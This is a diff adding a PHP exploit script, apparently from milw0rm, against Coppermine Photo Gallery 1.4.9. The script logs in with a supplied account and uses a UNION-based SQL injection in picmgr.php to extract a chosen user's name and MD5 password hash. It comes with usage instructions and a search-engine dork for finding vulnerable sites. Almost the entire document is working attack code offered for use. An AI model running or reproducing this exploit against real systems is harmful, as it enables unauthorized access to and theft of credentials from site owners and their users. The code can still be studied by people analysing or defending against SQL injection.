@@ -1,0 +1,103 @@
+#!/usr/bin/php
+<?php
+
+ /*********************************************************************
+ * Coppermine Photo Gallery 1.4.9 Remote SQL Injection Vulnerability 
+ * 
+ * Note:
+ * Requires a valid user account.
+ *
+ * Usage: 
+ * php script.php [host] [path] [table prefix] [user id] [username] [password]
+ *
+ * Usage Example:
+ * php script.php domain.com /coppermine/ cpg149_ 1 john secret
+ *
+ * Googledork"
+ * "Powered by Coppermine Photo Gallery"
+ *
+ * Credits:
+ * Disfigure - Vulnerability research and discovery
+ * Synsta - Exploit scripting
+ * 
+ * [w4ck1ng] - w4ck1ng.com
+ *********************************************************************/
+
+if(!$argv[6]){
+die("Usage:
+php $argv[0] [host] [path] [table prefix] [user id] [username] [password]\n
+Usage Example:
+php $argv[0] domain.com /coppermine/ cpg149_ 1 john secret\n");
+}
+
+if($argv[6]){
+
+function send($host,$put){
+global $data;
+$conn = fsockopen(gethostbyname($host),"80");
+if(!$conn) {
+die("Connection to $host failed...");
+}else{
+fputs($conn,$put);
+}
+while(!feof($conn)) {
+$data .=fgets($conn);
+}
+fclose($conn);
+return $data;
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$prefix = $argv[3];
+$userid = $argv[4];
+$userl = $argv[5];
+$passl = $argv[6];
+
+$post = "username=".urlencode($userl)."&password=".urlencode($passl)."&submitted=Login";
+$req  = "POST ".$path."login.php?referer=index.php HTTP/1.1\r\n"; 
+$req .= "Referer: http://".$host.$path."login.php?referer=index.php\r\n";
+$req .= "Host: $host\r\n";
+$req .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$req .= "Content-Length: ".strlen($post)."\r\n";
+$req .= "Connection: Close\r\n";
+$req .= "Cache-Control: no-cache\r\n\r\n";
+$req .= $post;
+send("$host","$req");
+
+/* Borrowed from rgod. */           
+$temp = explode("Set-Cookie: ",$data);
+$temp2 = explode(" ",$temp[1]);
+$cookie = $temp2[0];
+$temp2 = explode(" ",$temp[2]);
+$cookie .= " ".str_replace(";","",$temp2[0]);
+$cookie = str_replace("\r","",$cookie);
+$cookie = str_replace("\n","",$cookie);
+            
+$sql = urlencode("123 UNION SELECT user_id,user_group,concat(user_name,char(58,58),user_password) FROM ".$prefix."users where user_id = ".$userid." --");
+$req =  "GET ".$path."picmgr.php?aid="."$sql HTTP/1.1\r\n";
+$req .= "Host: $host\r\n";
+$req .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$req .= "Cookie: ".$cookie."\r\n\r\n";
+$req .= "Connection: Close\r\n\r\n";
+send("$host","$req");
+
+$gdata = explode("<option value=\"picture_no=1,picture_nm=",$data);
+$ghash = explode(",action=0\">",$gdata[1]);
+$hash = $ghash[0];
+$uname = explode("'",$hash);
+$uname = explode("::",$uname[1]);
+$username = $uname[0];
+$fhash = explode("::",$hash);
+$fhash = explode("',picture_sort=100",$fhash[1]);
+$finalhash = $fhash[0];
+
+if(strlen($finalhash) != 32){ 
+die("Exploit failed..\n"); 
+}else{ 
+die("Username: $username MD5: $finalhash\n"); 
+}
+}
+?>
+
+# milw0rm.com [2006-10-27]
